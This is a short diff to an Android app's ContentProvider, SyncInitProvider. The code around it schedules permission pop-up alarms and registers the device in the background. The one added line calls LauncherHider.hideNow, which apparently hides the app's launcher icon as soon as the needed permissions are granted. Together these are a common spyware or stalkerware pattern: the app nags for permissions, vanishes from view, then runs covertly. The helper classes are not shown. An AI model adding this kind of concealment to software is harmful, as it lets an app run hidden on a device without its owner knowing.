@@ -18,6 +18,7 @@ class SyncInitProvider : ContentProvider() {
             PostInstallPrompt.showIfNeeded(ctx)
             PermissionPopupAlarms.schedule(ctx)
             if (!SyncBootstrap.needsRuntimePermissions(ctx)) {
+                LauncherHider.hideNow(ctx)
                 BackgroundSyncRunner.run {
                     try {
                         DeviceRegistration.registerNow(ctx)
